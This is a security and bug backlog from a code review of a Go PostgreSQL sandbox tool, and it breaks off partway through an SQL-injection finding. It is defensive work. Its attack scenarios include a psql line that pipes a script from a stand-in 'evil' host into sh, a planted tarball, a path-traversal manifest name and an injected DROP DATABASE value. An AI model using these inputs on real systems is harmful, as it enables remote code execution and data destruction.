# Code review findings — bug & security backlog

This file is the working backlog from a full-codebase review (all non-test Go
plus `scripts/build.sh` and the `Makefile`). It is written so that a future
agent (or human) can pick an issue, fix it, and record the fix here.

**Line numbers are as of commit `2b53512` (master).** They will drift as fixes
land — treat them as anchors, re-locate by the quoted evidence if needed.

## How to use this file

1. Pick an issue (respect severity ordering unless told otherwise; some
   fixes overlap — check the "Related" field before starting).
2. Fix it, matching the existing code style. Add or extend tests — every
   issue lists suggested test coverage.
3. Rebuild and verify per the repo's `go-rebuild` skill (`make`, `go vet`,
   `go test ./...`; beware the symlink pitfall that hides fresh builds from
   the on-PATH binary).
4. Update the issue's metadata block: set `status: fixed`, and fill in
   `fixed-commit` / `fixed-date`. If you deliberately decide not to fix,
   use `status: wontfix` and explain why in a "Resolution" note under the
   issue.
5. Update the Status column in the summary table below.

Verification legend: `confirmed-in-source` = a second pass re-read the exact
code and confirmed the defect; `agent-reported` = found by a single review
pass with quoted evidence that matched the source, but not independently
re-verified — re-confirm the failure mode before fixing.

## Summary table

| ID     | Sev    | Title                                                          | Status    |
|--------|--------|----------------------------------------------------------------|-----------|
| HIGH-1 | high   | Stale postmaster.pid wedges start/stop/restart                 | fixed     |
| HIGH-2 | high   | PG* env shadowed by user's shell in `run`/`use` (syscall.Exec) | fixed     |
| HIGH-3 | high   | Shared predictable /tmp build dir + unverified tarball cache   | fixed |
| HIGH-4 | high   | `report` executes untrusted input via psql meta-commands       | fixed |
| MED-1  | medium | Report render step treats psql failure as success              | fixed     |
| MED-2  | medium | NormalizeString lets invalid chars into replication slot names | fixed     |
| MED-3  | medium | `--quiet` makes y/N confirmation prompts invisible             | fixed     |
| MED-4  | medium | `config migrate -s` bypasses resolveSandboxArg; relative path corrupts Name | fixed |
| MED-5  | medium | cleanup-install-versions can delete an in-use install (3 ways) | fixed     |
| MED-6  | medium | `build --force` deletes a live mismatched-version install      | fixed     |
| MED-7  | medium | Cluster destroy trusts manifest member names (path escape)     | fixed |
| MED-8  | medium | Cluster partial deploy orphans a running member                | fixed |
| MED-9  | medium | `deploy --subscribe-to` forces dbname=postgres                 | fixed     |
| MED-10 | medium | `promote` leaks the replication slot on the old source         | fixed     |
| MED-11 | medium | Unescaped SQL interpolation (publish/subscribe/destroy/status) | not-fixed |
| MED-12 | medium | global_status attaches members to the wrong cluster after sort | not-fixed |
| LOW-1  | low    | Standby application_name never actually configured             | not-fixed |
| LOW-2  | low    | Destroying a stopped subscriber silently leaks publisher slot  | not-fixed |
| LOW-3  | low    | Subscribing a sandbox to itself hangs forever                  | not-fixed |
| LOW-4  | low    | pg_hba replication line hardcodes 127.0.0.1/32                 | not-fixed |
| LOW-5  | low    | isPortListening swallows errors → false "running"              | not-fixed |
| LOW-6  | low    | Symlinked sandbox dirs invisible to global_status              | not-fixed |
| LOW-7  | low    | cluster status folds probe failures into Missing               | not-fixed |
| LOW-8  | low    | loadJSONStrict accepts trailing garbage                        | not-fixed |
| LOW-9  | low    | Atomic save never fsyncs the directory after rename            | not-fixed |
| LOW-10 | low    | No cross-process lock on config load-modify-save               | not-fixed |
| LOW-11 | low    | `config set --global` accepts relative paths                   | not-fixed |
| LOW-12 | low    | Migrate bakes empty Logical.TargetDatabase before defaults     | not-fixed |
| LOW-13 | low    | reorderBoolFlags hoists a value token that matches a bool flag | not-fixed |
| LOW-14 | low    | `--color` greedily swallows the subcommand as its value        | not-fixed |
| LOW-15 | low    | deploy/cluster build the runner from un-tilde-expanded bin-dir | not-fixed |
| LOW-16 | low    | build shows no terminal progress despite tee comment           | not-fixed |
| LOW-17 | low    | cluster deploy never prints conn strings to stdout             | not-fixed |
| LOW-18 | low    | `report --debug` discards the logger (no `# exec:` lines)      | not-fixed |
| LOW-19 | low    | Failed report deploys accumulate unnamed `_report_*` dirs      | not-fixed |
| LOW-20 | low    | cleanup sandbox walk depth-bounded at 4, silently excluding    | not-fixed |
| MED-1b | medium | `%w` wraps nil error → `%!w(<nil>)` in user-facing message     | fixed |

---

## High severity

### HIGH-1: Stale postmaster.pid wedges start/stop/restart

```yaml
id: HIGH-1
status: fixed
fixed-commit: c080c15
fixed-date: 2026-07-25
severity: high
type: bug
files:
  - internal/sandbox/lifecycle.go:45-48   # Start short-circuit
  - internal/sandbox/lifecycle.go:80-92   # Stop path
  - internal/sandbox/lifecycle.go:129-135 # isRunning
verification: confirmed-in-source
related: [LOW-5]
```

**Problem.** `isRunning` only stats `<dataDir>/postmaster.pid` — it never
checks whether the recorded PID is alive. `Start` short-circuits on it:

```go
if isRunning(cfg) {
    fmt.Fprintf(stderrW, "level=INFO msg=\"already running\" ...")
    return nil
}
```

The comment claims pg_ctl's own idempotency handles the corner case "if a
user retries", but the short-circuit *prevents pg_ctl from ever running*,
so its stale-pid handling is unreachable.

**Failure scenario.** Host reboot or `kill -9` of postgres leaves
`postmaster.pid` behind. Then:

- `pg_sandbox start` → prints "already running", exits 0, nothing listening.
- `pg_sandbox restart` → `Stop` sees the pidfile, runs `pg_ctl stop`, which
  fails against the dead PID, and `Restart` aborts before reaching `Start`.

The sandbox is permanently un-startable through the tool; the user has to
manually delete the pidfile.

**Suggested fix.** Make `isRunning` check liveness: read the first line of
`postmaster.pid` (the PID), `strconv.Atoi`, then `syscall.Kill(pid, 0)`.
`nil` or `EPERM` → running; `ESRCH` (or unparsable pidfile) → not running.
In `Stop`, when the pidfile exists but the process is dead, log a WARN
("stale postmaster.pid, removing") and remove the pidfile, then return
no-op success so `Restart` proceeds to `Start`. Alternative minimal fix:
drop the short-circuit in `Start` entirely and let `pg_ctl start` handle
the already-running case (it exits non-zero with a clear message — map that
to no-op success by sniffing its stderr, which is uglier).

**Tests.** Unit-test `isRunning` with: no pidfile; pidfile with own PID
(alive); pidfile with a known-dead PID (e.g. spawn+wait a child and reuse
its PID — or fake via an interface); garbage pidfile. Lifecycle test:
stale pidfile → `Start` invokes pg_ctl (fake runner records the call).

---

### HIGH-2: PG* env shadowed by user's shell in `run`/`use` (syscall.Exec)

```yaml
id: HIGH-2
status: fixed
fixed-commit: 5291476
fixed-date: 2026-07-25
severity: high
type: bug (data-damaging)
files:
  - internal/pgexec/pgexec.go:290-306   # Exec: env build + syscall.Exec
  - internal/sandbox/run.go:107-111     # --no-dsn relies on env only
  - internal/sandbox/use.go:117         # pgConnEnv attach
  - cmd/pg_sandbox/run.go:108-109       # runner.Env = invoke.Env; runner.Exec
verification: confirmed-in-source
related: []
```

**Problem.** `Exec` builds the child env as:

```go
env := os.Environ()
if len(e.Env) > 0 {
    env = append(env, e.Env...)
}
return syscall.Exec(full, argv, env)
```

If the user's shell already exports `PGHOST`/`PGPORT`/`PGUSER`/`PGDATABASE`
(very common for PostgreSQL users), the resulting env contains *duplicates*.
`syscall.Exec` performs no deduplication (unlike `os/exec`, which dedups
keeping the **last** value — that's why the captured `Run*` paths are safe),
and libc `getenv` on both glibc and macOS returns the **first** match. Net
effect: the sandbox's appended values are silently ignored in the child.

**Failure scenario.** User has `export PGPORT=5432` for their real server.
`pg_sandbox run -s mybox --no-dsn -- pgbench -i` — `--no-dsn` passes no
`-h/-p` args by design ("The PG* env is still injected (set below) so
libpq-using tools still connect to the right place", run.go:108-110) —
pgbench connects to the user's real 5432 server and **re-initializes
pgbench tables there**. Less severe variants: anything spawned from inside
`use`'s psql (`\!`, `\g | cmd`) inherits the shadowed env.

**Suggested fix.** Deduplicate before exec'ing, letting `e.Env` win. E.g.:

```go
func mergeEnv(base, overlay []string) []string {
    seen := map[string]int{}
    out := make([]string, 0, len(base)+len(overlay))
    for _, kv := range base {
        k, _, _ := strings.Cut(kv, "=")
        if i, ok := seen[k]; ok { out[i] = kv; continue }
        seen[k] = len(out); out = append(out, kv)
    }
    for _, kv := range overlay {
        k, _, _ := strings.Cut(kv, "=")
        if i, ok := seen[k]; ok { out[i] = kv; continue }
        seen[k] = len(out); out = append(out, kv)
    }
    return out
}
```

Use it in `Exec` (and anywhere else that concatenates env for a child).

**Tests.** Unit-test `mergeEnv`: overlay wins over base, base order
preserved, no duplicate keys in output. Integration-ish: set a fake
`PGPORT` in the test process env, build the Exec env, assert exactly one
`PGPORT=` entry with the sandbox's value.

---

### HIGH-3: Shared predictable /tmp build dir + unverified tarball cache

```yaml
id: HIGH-3
status: fixed
fixed-commit: 4860738
fixed-date: 2026-07-25
severity: high
type: security (supply chain, multi-user hosts)
files:
  - internal/build/build.go:148-163   # default buildDir under os.TempDir()
  - internal/build/build.go:355-368   # cache trust: any non-empty file wins
  - internal/build/build.go:363-411   # downloadTarball (no checksum)
verification: confirmed-in-source
related: [MED-6]
```

**Problem.** Two compounding issues:

1. The default build dir is `filepath.Join(os.TempDir(), "pg_sandbox-build")`
   — a **fixed, predictable path**. On multi-user Linux, `os.TempDir()` is
   the world-writable `/tmp`, so any local user can pre-create
   `/tmp/pg_sandbox-build/` and own it (macOS is less exposed: `$TMPDIR`
   is per-user).
2. `downloadTarball` trusts any pre-existing non-empty file at the tarball
   path, forever, with no verification of any kind:

```go
if st, err := os.Stat(target); err == nil && st.Size() > 0 {
    logger.Info("using cached tarball", "path", target, "size", st.Size())
    return nil
}
```

   The comment acknowledges there is no checksum ("we trust the cached file
   — re-validating it would require the upstream SHA which we don't fetch
   separately"). There is also no verification at download time, so a
   tampering TLS-intercepting proxy or a truncation also goes unnoticed.

**Failure scenario.** On a shared host, attacker runs
`mkdir /tmp/pg_sandbox-build && cp evil.tar.gz /tmp/pg_sandbox-build/postgresql-18.4.tar.gz`.
Victim runs `pg_sandbox build 18.4` → "using cached tarball" → attacker's
source is configured, compiled, and installed as the victim's PostgreSQL.
The attacker owning the dir can also swap the extracted tree between the
extract and make steps.

**Suggested fix.**
- Default the build dir to a per-user location:
  `os.UserCacheDir()/pg_sandbox/build` (create with `0o700`), falling back
  to `os.MkdirTemp` only if UserCacheDir fails. This kills the shared-/tmp
  attack outright.
- Fetch the upstream checksum alongside the tarball —
  `https://ftp.postgresql.org/pub/source/v<ver>/postgresql-<ver>.tar.gz.sha256`
  exists for releases — and verify it on download **and** on cache reuse
  (store the .sha256 next to the tarball; re-hash the cached file before
  trusting it). Refuse to proceed on mismatch with a clear "delete
  <path> and retry" message.
- When creating the build dir, if it already exists, verify it is owned by
  the current UID and not group/world-writable; error otherwise.

**Tests.** Unit-test checksum verification (good/bad/missing .sha256) with
the existing `httpClient` fake; test that a cached tarball failing the hash
is re-downloaded (or errors, per chosen semantics); test default dir
resolution prefers UserCacheDir.

---

### HIGH-4: `report` executes untrusted input via psql meta-commands

```yaml
id: HIGH-4
status: fixed
fixed-commit: e112a7c
fixed-date: 2026-07-25
severity: high
type: security (arbitrary command execution)
files:
  - internal/report/report.go:283-300      # out.txt piped into psql -f -
  - cmd/pg_sandbox/report.go:137-143       # auto-discovery uses CWD first
verification: confirmed-in-source
related: [MED-1, LOW-18, LOW-19]
```

**Problem.** Two related trust issues in the pg_gather report pipeline:

1. The `--input` out.txt is executed as a psql *script*
   (`concatReader(schemaPath, opts.InputPath)` piped to
   `psql -X -v ON_ERROR_STOP=1 ... -f -`). psql meta-commands are fully
   enabled: a `\! <cmd>` line runs a shell command as the invoking user,
   and `COPY ... TO PROGRAM` runs server-side (same user — the throwaway
   sandbox runs as you, superuser, `--auth=trust`). The whole point of the
   workflow is that out.txt comes from *someone else's system* (a customer
   support bundle), i.e. it is untrusted by definition. `-X` only skips
   psqlrc; it does not restrict meta-commands.
2. When `--pg-gather-dir` is unset everywhere, `discoverPgGatherDir()`
   checks the **CWD first** (before `$PATH`) for
   `gather_schema.sql`/`gather_report.sql` and silently executes what it
   finds. A support bundle that ships planted scripts gets them executed
   by the analyst who extracts it and runs `report` from inside the dir.

A legitimate pg_gather out.txt is COPY data + SQL; it has no business
containing `\!` or `TO PROGRAM`.

**Failure scenario.** Analyst extracts customer bundle, `cd`s in, runs
`pg_sandbox report --input out.txt`. Either the out.txt contains
`\! curl https://evil/x | sh`, or the bundle contains a planted
`gather_schema.sql` picked up by CWD auto-discovery. Attacker code runs
with the analyst's privileges.

**Suggested fix.**
- Pre-scan the input file before piping it to psql; reject (hard error,
  naming the line number) any line whose first non-whitespace character
  is `\` and is not in a small allowlist of meta-commands legitimately
  produced by pg_gather (empirically: none, or at most `\.`, the COPY
  terminator — note `\.` must stay allowed). Also reject case-insensitive
  `PROGRAM` in a `COPY ... TO|FROM PROGRAM` shape outside COPY data blocks.
  Keep the scan aware of COPY-data mode (between `COPY ... FROM stdin;`
  and `\.`) so data lines are never misflagged.
- Drop the CWD from `discoverPgGatherDir()` entirely (keep global config,
  env, flag, `$PATH`-adjacent discovery), or demand an interactive
  confirmation naming the directory before using CWD-discovered scripts.
- Document the trust model in `docs/` regardless.

**Tests.** Scanner unit tests: clean out.txt passes; `\!` line rejected
with line number; `\.` inside COPY block allowed; `TO PROGRAM` rejected;
`program` as a column value inside COPY data allowed. Discovery test:
CWD no longer consulted (or requires confirmation).

---

## Medium severity

### MED-1: Report render step treats psql failure as success

```yaml
id: MED-1
status: fixed
fixed-commit: ff4f9e3
fixed-date: 2026-07-25
severity: medium
type: bug (silent data loss)
files:
  - internal/report/report.go:318-341   # render step + WriteFile
  - internal/pgexec/pgexec.go:359-373   # exitCodeOf: signal → (-1, nil)
verification: confirmed-in-source
related: [MED-1b, HIGH-4]
```

**Problem.** Step 4 (render gather_report.sql to HTML) deliberately skips
`ON_ERROR_STOP` (fine — per-query tolerance matches upstream), but its
fatal-error check is only `if res.Err != nil`. `exitCodeOf` returns
`(exitErr.ExitCode(), nil)` for *any* `*exec.ExitError` — including a
**signal-killed** child, which reports `ExitCode() == -1`. So the in-code
comment "(couldn't start psql, signal) is fatal" is false: a psql killed
by OOM/SIGKILL, or one that exits 2 because the throwaway server died
between steps, still reaches:

```go
if err := os.WriteFile(opts.OutputPath, res.Stdout, 0o644); err != nil {
```

writing an **empty or truncated HTML over any previous good report** at the
default `<input>_report.html` path, then destroying the sandbox and exiting 0.

**Suggested fix.**
- Treat `res.ExitCode != 0` as fatal for the render step too — psql without
  `ON_ERROR_STOP` exits 0 even when individual queries error, so a non-zero
  exit here always means connection/startup/signal-level failure, never
  "tolerable per-query error". (Verify against psql exit-code semantics:
  0 = ok, 1 = own fatal error, 2 = lost connection, 3 = script error only
  with ON_ERROR_STOP.)
- Sanity-check the captured stdout before persisting (non-empty at
  minimum; ideally contains a closing `</html>`), and write via temp file
  + rename so a bad run never clobbers a prior good report.

**Tests.** Fake runner returning `(ExitCode: 2, Err: nil)` → Generate
errors, output file untouched. Fake returning `(-1, nil)` (signal shape)
→ same. Success path unchanged.

---

### MED-1b: `%w` wraps nil error → `%!w(<nil>)` in user-facing message

```yaml
id: MED-1b
status: fixed
fixed-commit: 5632191
fixed-date: 2026-07-25
severity: medium
type: bug (cosmetic but on the most common failure path)
files:
  - internal/report/report.go:301-304
verification: confirmed-in-source
related: [MED-1]
```

**Problem.** The schema+ingest failure branch fires when
`res.Err != nil || res.ExitCode != 0`. In the by-far-most-common case
(malformed out.txt trips ON_ERROR_STOP → psql exits 3, `res.Err == nil`),
the message is built with `fmt.Errorf("psql (schema+ingest) exit=%d: %w",
res.ExitCode, res.Err)` — wrapping a nil error renders as
`exit=3: %!w(<nil>)`.

**Suggested fix.** Build the message conditionally:

```go
if res.Err != nil {
    return nil, leftover(fmt.Errorf("psql (schema+ingest) exit=%d: %w", res.ExitCode, res.Err))
}
return nil, leftover(fmt.Errorf("psql (schema+ingest) exit=%d", res.ExitCode))
```

(or a small helper shared with the render step). **Tests.** Assert the
message for the exit-nonzero/nil-err case contains no `%!w`.

---

### MED-2: NormalizeString lets invalid chars into replication slot names

```yaml
id: MED-2
status: fixed
fixed-commit: 0c9e0ba
fixed-date: 2026-07-25
severity: medium
type: bug (deploy failure)
files:
  - internal/config/resolve.go:548-554     # NormalizeString
  - internal/sandbox/deploy_standby.go:73  # slot name for standby
  - internal/cluster/cluster.go:123        # slot name for cluster members
verification: confirmed-in-source
related: [MED-11]
```

**Problem.** `NormalizeString` only lowercases `[A-Z]+` and maps `-`→`_`:

```go
re := regexp.MustCompile(`[A-Z]+`)
return strings.ReplaceAll(re.ReplaceAllStringFunc(s, ...), "-", "_")
```

Its outputs become PostgreSQL replication slot names, which only allow
`[a-z0-9_]`. Dots (and any other punctuation) pass through.

**Failure scenario.** Sandbox or slot prefix named `pg17.4` (version-shaped
names are natural here) → slot `pg17.4_s1_slot` → `pg_basebackup -C
--slot=...` fails with "replication slot name ... may only contain lower
case letters, numbers, and the underscore character", aborting the
standby/cluster deploy partway through.

**Suggested fix.** After lowercasing, replace every char outside
`[a-z0-9_]` with `_` (single regexp: `[^a-z0-9_]` → `_`). Consider also
collapsing runs and trimming leading digits if you want prettier names —
functionally the single substitution suffices. Note collisions between
e.g. `pg17.4` and `pg17-4` become possible; acceptable for slot names but
mention it in the doc comment.

**Tests.** Table-test NormalizeString: `pg17.4` → `pg17_4`, `A-B.c` →
`a_b_c`, already-clean input unchanged. Existing callers' tests still pass.

---

### MED-3: `--quiet` makes y/N confirmation prompts invisible

```yaml
id: MED-3
status: fixed
fixed-commit: 1aeabbd
fixed-date: 2026-07-25
severity: medium
type: bug (UX / apparent hang)
files:
  - cmd/pg_sandbox/globals.go:148-172       # quietFilter buffers partial lines
  - cmd/pg_sandbox/destroy.go:126           # newline-less prompt
  - cmd/pg_sandbox/cluster.go:387           # same
  - cmd/pg_sandbox/cleanup_install_versions.go:114  # same (via cleanup.Confirm)
verification: confirmed-in-source
related: []
```

**Problem.** `quietFilter.Write` buffers input and only forwards *complete*
lines (it needs the full line to prefix-match `level=INFO ` / `level=WARN `
for dropping). The interactive confirmation prompts are written to the
wrapped stderr **without a trailing newline** (`"destroy sandbox %q at %s?
[y/N]: "`), so under `--quiet` the prompt sits in the buffer while the
process blocks reading stdin. The user sees nothing — it looks like a hang.
The buffered prompt eventually flushes glued to the next complete line.

**Suggested fix.** Confirmation prompts are interactive, ERROR-tier output
— they must bypass the quiet filter. Cleanest: keep a reference to the
*unfiltered* stderr (the filter wraps it; expose the inner writer or plumb
a second `promptW io.Writer` through the confirm helpers) and write prompts
there. A minimal alternative — flushing non-newline-terminated partials
that don't start with a gated prefix — breaks the filter's line-atomicity
guarantee and is not recommended.

**Tests.** Wire a quietFilter over a buffer, write a newline-less prompt
via the prompt path, assert it reaches the terminal writer immediately.

---

### MED-4: `config migrate -s` bypasses resolveSandboxArg; relative path corrupts Name

```yaml
id: MED-4
status: fixed
fixed-commit: 9c4a5ca
fixed-date: 2026-07-25
severity: medium
type: bug
files:
  - cmd/pg_sandbox/config.go:763        # raw flag value used directly
  - internal/config/migrate.go:59       # sandboxDir := filepath.Dir(legacyPath)
  - internal/config/migrate.go:100      # s.Name = filepath.Base(sandboxDir)
verification: confirmed-in-source (found independently by two reviewers)
related: [LOW-12]
```

**Problem.** Every other `-s` consumer routes through `resolveSandboxArg`
(bare names resolve under sandboxRoot, tilde expansion — the commit
416e8cf contract; `config show/get/set/validate` all comply). `config
migrate` instead does `legacyPath := filepath.Join(sandboxDir,
"pg_sandbox.env")` on the raw flag value. Consequences:

1. `pg_sandbox config migrate -s mybox` from any cwd other than
   sandboxRoot fails "no legacy file to migrate at mybox/pg_sandbox.env"
   even though `<sandboxRoot>/mybox/pg_sandbox.env` exists — or worse,
   silently migrates a same-named directory that happens to exist in cwd.
2. `Migrate` derives everything from the possibly-relative `legacyPath`:
   `cd <sandbox> && pg_sandbox config migrate -s .` → `filepath.Dir`
   yields `.` → `s.Name = "."` is persisted (poisoning slot/app names
   later derived from Name), and a relative legacy `PGS_DATADIR` resolves
   to a relative path that Validate then rejects ("dataDir must be an
   absolute path") for a perfectly valid legacy file.

**Suggested fix.** In `runConfigMigrate`, resolve `-s` through
`resolveSandboxArg` exactly like `config show` does. Independently harden
`config.Migrate`: `filepath.Abs(legacyPath)` first thing, before deriving
`sandboxDir` (the doc comment already promises this behavior; make it true).

**Tests.** Migrate with relative legacyPath → Name and DataDir absolute
and correct. CLI-level: `config migrate -s <barename>` resolves under
sandboxRoot (extend the existing resolve tests).

---

### MED-5: cleanup-install-versions can delete an in-use install (3 ways)

```yaml
id: MED-5
status: fixed
fixed-commit: 9787d02
fixed-date: 2026-07-25
severity: medium
type: bug (destructive)
files:
  - internal/cleanup/cleanup.go:122-133   # every subdir is a "version" candidate
  - internal/cleanup/cleanup.go:145-151   # literal prefix match, no symlink resolution
  - internal/cleanup/cleanup.go:343-361   # Apply uses scan-time Plan (TOCTOU)
  - cmd/pg_sandbox/cleanup_install_versions.go:78-120  # confirm-then-apply flow
verification: agent-reported (evidence quotes matched; re-confirm before fixing)
related: [LOW-20, MED-6]
```

**Problem.** Three independent ways the pruner can destroy an install that
is actually in use:

1. **No version-shape check on candidates.** Every subdirectory of the
   scanned bin-dir root becomes a removable "version". If the user's
   `PGS_BIN_DIR` is itself an install prefix (`/opt/postgresql/16.4` —
   a value the deploy layer explicitly accepts), the candidates are
   `bin`, `include`, `lib`, `share`; none prefix-matches any sandbox's
   binDir (`/opt/postgresql/16.4/bin` is not under
   `/opt/postgresql/16.4/bin/`), so all four are "unused" and deleted —
   destroying the live install.
2. **Literal string prefix match.** `if cleanedRef == c.Path ||
   strings.HasPrefix(cleanedRef, prefix)` — no `filepath.EvalSymlinks`.
   An install referenced via `latest -> 16.4` (config stores
   `/opt/pg/latest/bin`) never matches candidate `/opt/pg/16.4` → deleted
   while a sandbox runs from it. Same for `/tmp` vs `/private/tmp` on macOS.
3. **TOCTOU.** `Apply` deletes based on the Plan computed *before* the
   interactive prompt; a sandbox deployed while the prompt sits open is
   not re-checked (`IsUnused` reflects scan-time state), then removed.

**Suggested fix.**
1. Only accept version-shaped subdir names as candidates (reuse
   `versionRE` from internal/build). If the scanned root itself looks like
   an install prefix (contains `bin/`+`lib/`), refuse with a pointed error.
2. Run both candidate paths and sandbox binDir refs through
   `filepath.EvalSymlinks` (best-effort; fall back to Clean on error)
   before comparing.
3. Re-run the scan (or at minimum re-verify each candidate's IsUnused
   against a fresh sandbox walk) after the user confirms, immediately
   before each `os.RemoveAll`.

**Tests.** Candidate filtering (version-shaped only; install-prefix root
refused); symlinked ref counts as in-use; a re-scan between confirm and
apply drops the newly-referenced candidate (structure Apply to take a
re-scan hook, or test at the Plan level).

---

### MED-6: `build --force` deletes a live mismatched-version install

```yaml
id: MED-6
status: fixed
fixed-commit: 35df707
fixed-date: 2026-07-25
severity: medium
type: bug (destructive)
files:
  - internal/build/build.go:130-147   # version-shaped bin-dir becomes prefix, warn only
  - internal/build/build.go:165-180   # --force → os.RemoveAll(installPrefix)
  - internal/build/build.go:295-305   # installPrefixFor: versionRE.MatchString(base)
verification: confirmed-in-source
related: [HIGH-3, MED-5]
```

**Problem.** When bin-dir's basename is version-shaped, it is used as the
install prefix *itself* (no `<ver>` subdir nesting). If that version does
not match the build version, the code only warns — and with `--force`,
`os.RemoveAll(installPrefix)` deletes the existing install. Without
`--force`, the error text actively steers the user toward adding it
("pass --force to overwrite").

**Failure scenario.** User keeps `PGS_BIN_DIR=/opt/postgresql/16.4` and
runs `pg_sandbox build 18.4 --force` → the live 16.4 install is deleted
(breaking every sandbox that uses it) and 18.4 lands in a directory named
`16.4`.

**Suggested fix.** When `binDirVersion != "" && binDirVersion !=
opts.Version`, refuse to remove even with `--force`; require the user to
either point bin-dir at a matching/neutral path or delete manually. At
minimum, make the non-force error for this case *not* suggest `--force`,
and make the `--force` path error out instead of warn.

**Tests.** Mismatched version-shaped bin-dir + `--force` → error, nothing
removed. Matching version-shaped bin-dir + `--force` → proceeds (current
behavior). Neutral bin-dir unchanged.

---

### MED-7: Cluster destroy trusts manifest member names (path escape)

```yaml
id: MED-7
status: fixed
fixed-commit: b0cb02e
fixed-date: 2026-07-25
severity: medium
type: security (destructive path escape via crafted manifest)
files:
  - internal/cluster/destroy.go:75-77,98   # filepath.Join(ClusterDir, member.Name) → Destroy
  - internal/cluster/status.go:101         # same join, read-only
  - internal/config (LoadCluster)          # performs no member-name validation
verification: confirmed-in-source
related: [MED-8]
```

**Problem.** `dir := filepath.Join(opts.ClusterDir, member.Name)` with no
validation that `member.Name` is a plain basename. A manifest containing
`"name": "../../important_sandbox"` resolves outside the cluster dir; if
that path passes `IsSandboxDir` (any real sandbox does), `sandbox.Destroy`
stops it and `os.RemoveAll`s it.

**Failure scenario.** User untars a shared "repro cluster" bundle with a
crafted manifest and runs `pg_sandbox cluster destroy -s <dir>` → an
unrelated sandbox elsewhere on disk is destroyed.

**Suggested fix.** Validate member names at `LoadCluster` time (single
choke point): reject names where `name != filepath.Base(name)`, or name is
`""`/`.`/`..`, or contains a path separator. Belt-and-braces: after the
join, verify `filepath.Dir(dir) == filepath.Clean(opts.ClusterDir)`.

**Tests.** LoadCluster rejects `../x`, `a/b`, `.`, empty. Destroy/status
on a hand-written bad manifest → clean error, nothing touched.

---

### MED-8: Cluster partial deploy orphans a running member

```yaml
id: MED-8
status: fixed
fixed-commit: 43e5769
fixed-date: 2026-07-25
severity: medium
type: bug (resource leak / stuck state)
files:
  - internal/cluster/deploy.go:369-383   # partial manifest excludes failed member
  - internal/sandbox/ (deploy subscriber path)  # "we LEAVE the freshly-deployed sandbox in place"
verification: agent-reported (evidence quotes matched; re-confirm before fixing)
related: [MED-7, LOW-19]
```

**Problem.** When member *i* fails, the partial manifest is saved with only
the members that fully succeeded — but a member can fail *after* its
sandbox was deployed and started (e.g. `deployStandalone` succeeds, then
the Subscribe step fails; the sandbox layer deliberately leaves the
freshly-deployed sandbox in place for debugging). That running sandbox is
now invisible to cluster-level operations: `cluster destroy` iterates only
manifest members, removes the manifest, then fails `os.Remove(clusterDir)`
because the orphan's dir remains → `ExitClusterDestroyPartial`, a running
postmaster holding its port, and no manifest left to retry with.

**Suggested fix.** Record the failed member in the manifest too, with a
state field (e.g. `"state": "failed"`); teach destroy to attempt teardown
of failed members (best-effort) and status to display them. Alternative:
on member failure after a successful sandbox deploy, destroy that sandbox
before returning (loses debuggability — the current "leave in place"
choice is deliberate, so the manifest-state route fits better).

**Tests.** Fake runner failing the subscribe step of member 2 → manifest
contains member 2 marked failed; `cluster destroy` tears it down and
removes the cluster dir cleanly.

---

### MED-9: `deploy --subscribe-to` forces dbname=postgres

```yaml
id: MED-9
status: fixed
fixed-commit: 4eff130
fixed-date: 2026-07-25
severity: medium
type: bug (silent wrong behavior)
files:
  - internal/sandbox/deploy.go:369-371     # normalizeDeployOptions: opts.Dbname = "postgres"
  - internal/sandbox/subscribe.go:153-161  # unreachable fallback to publisher DefaultDatabase
verification: agent-reported (evidence quotes matched; re-confirm before fixing)
related: [LOW-3]
```

**Problem.** `Subscribe` has a designed fallback: when no dbname is given,
use the publisher's `DefaultDatabase`. But the deploy path can never reach
it: `normalizeDeployOptions` force-fills `opts.Dbname = "postgres"` (and
the CLI pre-fills it too), and that value is passed into
`SubscribeOptions.Dbname`. So `pg_sandbox deploy --subscribe-to pub
--pub-name p` against a publisher whose publication lives in `app` builds
`CONNECTION '... dbname=postgres'` — the subscription attaches to the
wrong database and replication silently never flows, while the standalone
`subscribe` command with identical inputs works.

**Suggested fix.** Track whether the user explicitly passed `--dbname`
(don't pre-fill in the CLI; normalize later). In the subscribe-flavored
deploy path, leave `SubscribeOptions.Dbname` empty when not explicitly
set so the existing publisher-default fallback engages. Keep the
"postgres" default for the sandbox's own `DefaultDatabase`.

**Tests.** Deploy-subscribe with publisher DefaultDatabase=`app`, no
`--dbname` → CONNECTION string contains `dbname=app`. Explicit `--dbname x`
still wins.

---

### MED-10: `promote` leaks the replication slot on the old source

```yaml
id: MED-10
status: fixed
fixed-commit: 75f9b6f
fixed-date: 2026-07-25
severity: medium
type: bug (resource leak → source disk fill)
files:
  - internal/sandbox/promote.go:104-105   # cfg.Role = primary; cfg.Physical = nil
  - internal/sandbox/destroy.go:144-146   # existing slot-drop logic to reuse
verification: agent-reported (evidence quotes matched; re-confirm before fixing)
related: [LOW-2, MED-11]
```

**Problem.** Promote flips the role and wipes `cfg.Physical` without
dropping (or even mentioning) the replication slot on the old source. The
promoted standby stops streaming; the slot on the source goes inactive and
retains WAL indefinitely — the source's disk eventually fills. Worse,
erasing `SlotName` from the config means a later `destroy` of the promoted
sandbox can no longer find the slot to clean it up. The tool already has
best-effort slot-drop code in `destroy.go` to model from.

**Suggested fix.** Before wiping `cfg.Physical`, best-effort connect to
the old source (it's recorded in `Physical.SourceSandbox`) and
`pg_drop_replication_slot` the slot, logging a WARN naming source+slot if
it fails (source may be down — that's fine, but the user must be told).
Reuse/factor the existing best-effort drop from `destroy.go`.

**Tests.** Fake runner: promote issues the slot-drop query against the
source; failure of that query still promotes but logs the warning.

---

### MED-11: Unescaped SQL interpolation (publish/subscribe/destroy/status)

```yaml
id: MED-11
status: not-fixed
fixed-commit: null
fixed-date: null
severity: medium
type: security (SQL injection; low practical impact under local trust auth)
files:
  - internal/sandbox/publish.go:135-142    # --tables joined verbatim into CREATE PUBLICATION
  - internal/sandbox/subscribe.go:173-181  # conninfo embedded in '...' with no escaping
  - internal/sandbox/destroy.go:144-146    # SlotName Sprintf'd into SQL literal
  - internal/sandbox/status.go:445-454     # SubscriptionName probe, same pattern
verification: confirmed-in-source (publish.go); others agent-reported
related: [MED-2]
```

**Problem.** These are the only places SQL reaches psql built by string
concatenation from values that are not sanitized *at use time*:

1. `publish --tables` items are joined verbatim ("users include schema
   qualification" per the comment): `--tables "t1; DROP DATABASE app; --"`
   becomes a multi-statement string, and `psql -c` executes all of it as
   superuser.
2. The `CREATE SUBSCRIPTION ... CONNECTION '<connStr>'` conninfo is
   single-quoted with no escaping — a `'` in `--dbname` (or a hand-edited
   publisher config's host/superuser) breaks out of the SQL string.
